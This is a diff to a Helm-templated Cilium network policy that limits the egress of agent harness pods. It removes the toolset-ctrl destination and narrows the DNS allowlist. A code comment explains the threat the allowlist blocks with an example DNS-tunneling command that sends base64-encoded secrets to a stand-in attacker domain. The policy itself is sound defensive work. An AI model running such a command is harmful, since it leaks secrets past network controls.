@@ -3,7 +3,7 @@
 # from a mounted read-only volume. It creates credentialed tool Jobs
 # via the kube API and dispatches them in-process. This is the SOLE
 # egress policy for each harness — it owns the L4 destinations
-# (kube-dns, kube-apiserver, toolset-ctrl, relay-ctrl) AND the L7 DNS
+# (kube-dns, kube-apiserver, relay-ctrl) AND the L7 DNS
 # allowlist on kube-dns. Default-deny otherwise.
 #
 # One CNP per workspace: the harness pod carries `sycophant.md/workspace`,
@@ -28,8 +28,9 @@
 # The L7 allowlist closes the DNS-tunneling exfil vector: without it, a
 # workspace can `dig <base64-secret>.evil.com @kube-dns` and leak data
 # through the resolver chain even with no external IP egress reachable.
-# Only the two controller hostnames are forwarded; all other DNS
-# queries drop at the Cilium L7 proxy before reaching kube-dns.
+# Only relay-ctrl, this workspace's tool pods, and its warm model
+# Services are forwarded; all other DNS queries drop at the Cilium L7
+# proxy before reaching kube-dns.
 {{- range $name, $ws := .Values.workspaces }}
 ---
 apiVersion: cilium.io/v2
@@ -59,7 +60,6 @@ spec:
               protocol: TCP
           rules:
             dns:
-              - matchName: "toolset-ctrl.{{ $.Release.Namespace }}.svc.cluster.local"
               - matchName: "relay-ctrl.{{ $.Release.Namespace }}.svc.cluster.local"
               # Per-call tool pods, keyed by call_id under this workspace's Service.
               - matchPattern: "*.capability-{{ $name }}.{{ $.Release.Namespace }}.svc.cluster.local"
@@ -77,14 +77,6 @@ spec:
       toPorts:
         - ports:
             - port: "6443"
-              protocol: TCP
-    - toEndpoints:
-        - matchLabels:
-            app.kubernetes.io/name: toolset-ctrl
-            app.kubernetes.io/part-of: sycophant
-      toPorts:
-        - ports:
-            - port: "9090"
               protocol: TCP
     # relay gateway: the harness dials Subscribe (inbound user
     # messages) and DeliverOutbound (reply + turn-state).
